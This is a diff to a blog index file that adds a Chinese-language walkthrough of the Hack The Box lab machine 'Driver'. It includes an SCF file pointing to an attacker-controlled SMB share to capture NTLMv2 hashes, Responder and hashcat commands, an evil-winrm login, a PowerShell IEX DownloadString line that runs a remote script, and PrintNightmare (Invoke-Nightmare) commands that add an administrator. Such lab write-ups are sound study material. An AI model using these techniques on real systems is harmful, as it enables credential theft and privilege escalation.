@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>HTB-Driver</title>
+      <link href="/2022/02/10/HTB-Driver/"/>
+      <url>/2022/02/10/HTB-Driver/</url>
+      
+        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前玩的都是Linux类型的靶机，今天就打一个Windows类型的靶机吧，希望可以学习一些渗透Windows系统的知识。</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><code>sudo nmap -A -sS -sC -sV -p- --min-rate 5000 10.10.11.106</code>扫描端口及服务。</p><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>端口信息</span></div>    <div class="hide-content"><p>Nmap scan report for 10.10.11.106<br>Host is up (0.72s latency).<br>Not shown: 65531 filtered ports<br>PORT     STATE SERVICE      VERSION<br>80/tcp   open  http         Microsoft IIS httpd 10.0<br>| http-auth:<br>| HTTP/1.1 401 Unauthorized\x0D<br>|_  Basic realm=MFP Firmware Update Center. Please enter password for admin<br>| http-methods:<br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: Site doesn’t have a title (text/html; charset=UTF-8).<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose|specialized<br>Running (JUST GUESSING): Microsoft Windows 2008|10|7|Vista (90%)<br>OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1<br>Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 10 1511 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows Vista SP2 (85%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</p><p>Host script results:<br>|<em>clock-skew: mean: 7h17m25s, deviation: 0s, median: 7h17m25s<br>| smb-security-mode:<br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|</em>  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode:<br>|   2.02:<br>|_    Message signing enabled but not required<br>| smb2-time:<br>|   date: 2022-02-12T16:46:31<br>|_  start_date: 2022-02-11T22:12:07</p></div></div><div class="note info simple"><p>nmap扫描要注意参数，否则不会检查到部分开放的端口。</p></div><p>WinRM（Windows Remote Management）服务能够让管理员远程登录Windows操作系统，获得一个可交互的shell，底层通讯协议使用的是HTTP。</p><h1 id="普通用户权限"><a href="#普通用户权限" class="headerlink" title="普通用户权限"></a>普通用户权限</h1><p>发现开启了http服务，访问时要求输入账号和密码，猜测为弱口令输入账号<code>admin</code>密码<code>admin</code>登录成功。果然与题目名称对应<mark class="hl-label blue">Driver</mark> ，是一个管理打印机的后台界面。<br>后台界面发现一个文件上传点，尝试上传php类型的shell，但是找不到访问上传文件的路径，目录扫描也没发现什么有趣的东西，参考别人的wp才知道可以利用SMB协议（445端口）相关漏洞。</p><h2 id="SMB简单介绍"><a href="#SMB简单介绍" class="headerlink" title="SMB简单介绍"></a>SMB简单介绍</h2><p>smb（server message block）是微软用来让局域网内的Windows主机共享文件和打印服务而创建的基于Client/Server模型的协议，人们有时将其与CIFS（Common Internet File System）交替的进行讨论，两者功能相同。<br>Samba是为了让类Unix系统与Windows系统之间可以共享文件和打印机而开发的一个软件。<br><a href="https://thecyphere.com/blog/smb-port/#:~:text=Simply%20put%2C%20port%20445%20is%20used%20for%20file,TCP%20and%20UDP%20protocols%20for%20several%20Microsoft%20services.">补充</a></p><h2 id="SCF文件攻击"><a href="#SCF文件攻击" class="headerlink" title="SCF文件攻击"></a>SCF文件攻击</h2><p>SCF(shell command files)可以用来执行一些有限的操作，比如显示Windows桌面、打开Windows浏览器，除此之外，SCF文件可以用来访问特定的UNC路径。当用户浏览该文件时会自动执行里面的命令，在文件名前面加上@符号，可以将该文件显示在共享设备的最顶部。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.10\share\wuoo.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><p>命名为<code>@whoami.scf</code>，通过上传点上传文件。<br>当用户浏览该文件后，会自动地与SCF文件UNC路径所代表的主机建立连接，并且Windows为了验证对该共享资源的访问权会发送自己的账号以及经过哈希加密之后的密码（NTLMv2 hash）。<br><code>responder -wrf --lm -v -I tun0 </code>命令用来捕获发送过来的哈希。<br><img src="https://s2.loli.net/2022/02/12/zjqsOMK68S1LmAc.png" alt="image.png"><br>这里作者上传了好多次文件才最终收到了hash，有可能是多用户共用一个靶机的原因。<br>该漏洞详细信息参考这篇文章：<a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">英文</a> <a href="https://zhuanlan.zhihu.com/p/32248261">中文</a><br>使用hashcat来进行破解,<code>hashcat -a 0 -m 5600 hash_to_crack /usr/share/wordlists/rockyou.txt --force</code><br><img src="https://s2.loli.net/2022/02/10/ypNdG8cKY5f9jvk.png" alt="image.png"><br>账号：tony<br>密码：liltony</p><h1 id="root权限获取"><a href="#root权限获取" class="headerlink" title="root权限获取"></a>root权限获取</h1><p><code>evil-winrm -i 10.10.11.106 -u tony -p liltony</code>以shell环境登录到Windows主机，输入前面获得的账号和密码进行登录。<br><code>tasklist</code>无法正常运行，那么使用<code>get-process</code>获取当前运行进程信息。<br>发现运行了<code>spoolsv</code>程序，经过搜索发现存在PrintNightmare<a href="https://github.com/calebstewart/CVE-2021-1675">CVE</a>漏洞。<br><code>IEX (New-Object Net.WebClient).DownloadString(&#39;#&#123;remote_script&#125;&#39;); </code>将远程的脚本加载到内存中，避免了下载脚本后再使用<code>Import-Module</code>导入到内存中。<br><code>Invoke-Nightmare -NewUser &quot;wiil&quot; -NewPassword &quot;whtt&quot; </code>创建拥有管理员权限的用户wiil。<br>可以使用自己特制的dll，这里作者能力有限就不加介绍了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 靶场 </category>
+          
+          <category> Hackthebox </category>
+          
+          <category> easy </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> HTB </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> smb协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>网鼎杯 2020 青龙组-AreUSerialz1</title>
       <link href="/2022/02/10/AreUSerialz/"/>
       <url>/2022/02/10/AreUSerialz/</url>
